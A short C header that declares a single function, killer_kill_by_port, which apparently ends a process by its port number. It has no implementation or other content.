#pragma once

#include "defines.h"

BOOL killer_kill_by_port(port_t);

